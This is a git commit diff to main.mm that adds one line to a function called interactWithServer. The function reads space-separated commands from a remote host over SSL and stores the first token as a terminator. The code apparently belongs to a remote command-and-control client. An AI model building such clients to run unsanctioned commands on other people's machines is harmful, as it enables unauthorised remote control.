5c783a818f8a8f18914fea590b3bd7d506ab407e
Ivan Nikolsky <enty8080@gmail.com>
2020-11-18 12:22:51 +0300

    Update main.mm

--- main.mm
+++ main.mm
@@ -48,6 +48,7 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     char buffer[2048] = "";
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[buffer componentsSeparatedByString:@" "]];
+        esCommand->terminator = (char*)[args[0] UTF8String];
         
         for (NSString *string in args) {
             NSLog(@"%@", string);
